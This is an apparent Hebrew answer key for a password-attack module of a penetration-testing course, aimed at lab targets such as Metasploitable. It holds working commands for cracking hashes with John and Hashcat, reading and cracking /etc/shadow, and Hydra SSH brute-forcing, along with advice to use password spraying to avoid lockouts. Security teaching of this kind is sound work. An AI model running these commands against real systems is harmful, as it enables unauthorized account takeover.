<div dir="rtl">

# ✅ פתרונות מלאים — מודול 8: מתקפות סיסמאות

> נסה לבד ב-[`missions.md`](missions.md) קודם.

---

## חלק א' — Hashes ו-Wordlists

**8.1**
```bash
ls -lh /usr/share/wordlists/
sudo gunzip /usr/share/wordlists/rockyou.txt.gz   # אם דחוס
wc -l /usr/share/wordlists/rockyou.txt            # → 14,344,392
```

**8.2**
```bash
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
# → MD5 (בין השאר). זהו ה-Hash של המחרוזת "password".
```

**8.3**
```bash
sudo apt install seclists -y
ls /usr/share/seclists/       # Passwords, Usernames, Discovery, Fuzzing...
```

---

## חלק ב' — סדיקה לא-מקוונת

**8.4**
```bash
echo '5f4dcc3b5aa765d61d8327deb882cf99' > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=raw-md5 hash.txt      # → password
```

**8.5**
```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat --show -m 0 hash.txt               # → ...:password
```
Hashcat דורש ציון mode מדויק (`-m 0`=MD5) אך מהיר בהרבה (GPU); John נוח ואוטומטי יותר.

**8.6**
```bash
sudo useradd -m testy && echo 'testy:Summer2024' | sudo chpasswd
sudo unshadow /etc/passwd /etc/shadow > crack.txt
john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
john --show crack.txt
```

---

## חלק ג' — סדיקה מקוונת

**8.7**
```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://<metasploitable-ip> -t 4
# ב-Metasploitable הסיסמה של msfadmin היא "msfadmin"
```

**8.8** —
- `-l admin` = שם משתמש יחיד · `-P rockyou.txt` = קובץ סיסמאות · `ssh://10.0.0.5` = פרוטוקול+יעד · `-t 4` = 4 חוטים במקביל (מאט את הקצב, פחות נעילות).

---

## חלק ד' — מתקפות רוחביות

**8.9** —
- **Brute Force** — הרבה סיסמאות נגד משתמש אחד; רועש, נועל חשבונות.
- **Password Spraying** — סיסמה אחת נפוצה נגד הרבה משתמשים; ניסיון אחד לכל חשבון → **נמנע מנעילה**.
- **Credential Stuffing** — פרטים שדלפו נגד מערכות אחרות (מיחזור סיסמאות).
תבחר **Spraying** כשיש מדיניות נעילת חשבונות — כי ניסיון בודד לכל משתמש לא מפעיל את הנעילה, ומספיק משתמש אחד עם `Winter2024!`.

---

## 🔴 אתגר מסכם — פתרון לדוגמה

```bash
# 1-2. מנייה + תקיפה מקוונת
enum4linux -a <ip>                                   # → משתמש: msfadmin
hydra -l msfadmin -P rockyou.txt ssh://<ip> -t 4     # → סיסמה: msfadmin
# 3. גישה
ssh msfadmin@<ip>
# 4. סדיקה לא-מקוונת (אם יש הרשאות)
sudo unshadow /etc/passwd /etc/shadow > c.txt
john --wordlist=/usr/share/wordlists/rockyou.txt c.txt
```
**תיעוד לדוגמה:**
```markdown
ממצא: סיסמה חלשה ל-SSH (msfadmin:msfadmin) — חומרה: High
PoC: Hydra מצא את הסיסמה תוך שניות; התחברות SSH הצליחה.
תיקון: אכוף מדיניות סיסמאות חזקה + MFA + נעילת חשבון אחרי 5 ניסיונות.
```

> עברת? המשך ל[מודול 9](../09-web-owasp/).

</div>
